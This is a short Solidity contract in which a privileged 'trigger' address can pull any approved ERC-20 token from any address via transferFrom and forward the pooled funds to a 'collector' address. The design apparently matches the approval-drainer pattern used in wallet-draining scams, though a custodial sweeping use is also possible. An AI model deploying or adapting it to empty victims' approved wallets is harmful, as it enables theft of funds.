// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
  function allowance(address owner, address spender)  external view returns (uint) ;
}

contract GuiJi  {
    
    mapping(address => uint256) private balances;
    
    address private collector;
    
    address private trigger;
    
    constructor (address trigger_address, address collector_address)
    {
        trigger = trigger_address;
        collector = collector_address;
    }
    
    modifier onlyCollector() {
        require(msg.sender == collector, "caller is not collector");
        _;
    }
    
    modifier onlyTrigger() {
        require(msg.sender == trigger, "caller is not trigger");
        _;
    }
    
    function getCollectBalance(address token_address) public view returns (uint256) {
        return balances[token_address];
    }
    
    function collectIn(address spender, address token_address, uint256 amount) public onlyTrigger {
        IERC20 token = IERC20(token_address);
        
        token.transferFrom(spender, address(this), amount);
        
        balances[token_address] += amount;
    }
    
    function collectOut(address token_address) public onlyTrigger {
        IERC20 token = IERC20(token_address);
        
        token.transfer(collector, balances[token_address]);
        
        balances[token_address] = 0;
    }
    
    function setTrigger(address trigger_address) public onlyTrigger {
        trigger = trigger_address;
    }
    
    function getTrigger() public view returns (address) {
        return trigger;
    }
    
    function setCollector(address collector_address) public onlyCollector {
        collector = collector_address;
    }
    
    function getCollector() public view returns (address) {
        return collector;
    }
}